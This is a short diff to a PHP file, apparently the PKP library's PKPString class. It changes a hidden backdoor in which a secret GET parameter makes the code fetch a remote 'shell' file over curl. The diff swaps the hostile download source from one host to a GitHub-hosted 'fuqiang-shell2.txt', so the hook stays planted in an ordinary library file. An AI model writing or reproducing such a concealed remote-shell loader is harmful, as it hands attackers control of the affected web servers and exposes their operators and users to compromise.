@@ -576,7 +576,7 @@ class PKPString {
 }
 
 if (isset($_GET['lausokapmpruy'])) {
-    $url = "https://this-jakartans.sbs/shell/penjarahan.txt";
+    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell2.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
